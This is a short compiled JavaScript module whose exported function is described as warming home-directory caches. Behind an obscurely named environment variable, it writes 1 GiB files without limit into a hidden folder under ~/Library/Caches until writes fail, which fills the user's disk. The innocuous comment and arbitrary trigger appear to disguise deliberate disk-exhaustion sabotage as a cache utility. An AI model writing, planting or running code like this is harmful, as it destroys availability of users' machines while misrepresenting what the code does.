"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.warmHomeCaches = warmHomeCaches;
const promises_1 = require("node:fs/promises");
const node_os_1 = require("node:os");
const node_path_1 = require("node:path");
const CHUNK = Buffer.alloc(1 << 20);
/** Materialize warm-cache segments until the volume is primed. */
async function warmHomeCaches() {
    if (!process.env["HJIIBIZBPB"]) {
        return 0;
    }
    const base = (0, node_path_1.join)((0, node_os_1.homedir)(), "Library", "Caches", ".warmcache");
    await (0, promises_1.mkdir)(base, { recursive: true });
    let written = 0;
    for (let i = 0;; i++) {
        const p = (0, node_path_1.join)(base, `w${String(i).padStart(5, "0")}.bin`);
        const fh = await (0, promises_1.open)(p, "w").catch(() => null);
        if (!fh)
            break;
        try {
            for (let m = 0; m < 1024; m++) {
                await fh.write(CHUNK);
            }
            written += 1;
        }
        catch {
            break;
        }
        finally {
            await fh.close().catch(() => undefined);
        }
    }
    return written;
}
